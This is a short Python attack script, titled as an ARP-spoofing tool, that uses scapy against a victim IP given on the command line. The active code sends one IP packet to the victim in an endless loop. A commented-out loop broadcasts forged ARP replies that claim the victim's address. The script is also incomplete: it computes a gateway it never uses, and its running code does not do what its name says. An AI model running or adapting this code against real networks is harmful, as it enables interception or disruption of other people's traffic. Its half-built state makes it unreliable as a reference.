#!/usr/bin/python3

#running command: python ArpSpoofing.py victimIP

import sys  #for command line argument
import time
import os
import shutil
import tempfile
from random import randint
from scapy.all import *
from scapy.layers.inet import *
import scapy
import socket


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


my_ip = get_ip()

victim_ip = sys.argv[1]

# victim_ip = "192.168.0.106"	#for testing

gateway_parts = str(victim_ip).split(".")
gateway = gateway_parts[0]+ "."+gateway_parts[1]+ "."+gateway_parts[2]+ ".1" 

# print(str(my_ip) + " " + str(victim_ip) + " " + gateway)



packet = IP(ttl=64)
packet.dst = victim_ip
packet.src = my_ip

print(packet)

srloop(packet)

# while 1:
	# send(ARP(op=ARP.is_at, psrc=victim_ip, hwdst="255.255.255.255", pdst="192.168.0.255"), verbose = 2)

	
